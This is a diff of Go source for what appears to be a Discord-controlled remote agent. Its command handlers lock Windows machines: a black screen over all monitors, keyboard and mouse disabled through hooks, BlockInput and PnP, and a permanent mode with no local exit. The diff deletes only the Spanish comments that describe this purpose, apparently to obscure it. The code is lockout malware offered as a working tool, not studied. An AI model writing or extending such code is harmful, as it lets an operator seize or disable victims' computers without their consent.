@@ -10,8 +10,6 @@ import (
 	"github.com/local/govoid/internal/win32"
 )
 
-// LockScreen atiende /lockscreen: baja una cortina negra sobre todos los
-// monitores, corta teclado y ratón y deja la máquina sin salida local.
 func LockScreen(s *discordgo.Session, i *discordgo.InteractionCreate) {
 	if err := Defer(s, i); err != nil {
 		return
@@ -27,15 +25,11 @@ func LockScreen(s *discordgo.Session, i *discordgo.InteractionCreate) {
 	}
 }
 
-// lockNow aplica el candado. Sin minutos es permanente: no hay temporizador
-// de salida y nada local lo levanta.
 func lockNow(s *discordgo.Session, i *discordgo.InteractionCreate) {
 	minutes := IntOption(i, "minutes")
 
 	var err error
 	if minutes > 0 {
-		// Modo con plazo: solo cortina, sin bandera ni capas. La bandera
-		// haría que los centinelas lo tomasen por permanente.
 		err = win32.DefaultLock.Start(time.Duration(minutes) * time.Minute)
 	} else {
 		err = win32.LockDown(ShieldBinary())
@@ -106,7 +100,6 @@ func reportStatus(s *discordgo.Session, i *discordgo.InteractionCreate) {
 	}
 }
 
-// deviceState traduce el indicador de hardware a texto de panel.
 func deviceState(disabled bool) string {
 	if disabled {
 		return "teclado y ratón deshabilitados en PnP"
@@ -114,7 +107,6 @@ func deviceState(disabled bool) string {
 	return "activos (solo hooks y BlockInput)"
 }
 
-// LockOn y LockOff atienden los botones del panel.
 func LockOn(s *discordgo.Session, i *discordgo.InteractionCreate) {
 	if err := Defer(s, i); err != nil {
 		return
@@ -133,8 +125,6 @@ func LockOff(s *discordgo.Session, i *discordgo.InteractionCreate) {
 	unlockNow(s, i)
 }
 
-// EnsureUnlocked se llama antes de apagar el agente: una máquina bloqueada sin
-// agente es una máquina inservible hasta reinstalar Windows.
 func EnsureUnlocked() {
 	if win32.LockRequested() || win32.DefaultLock.Active() {
 		_ = win32.UnlockAll()
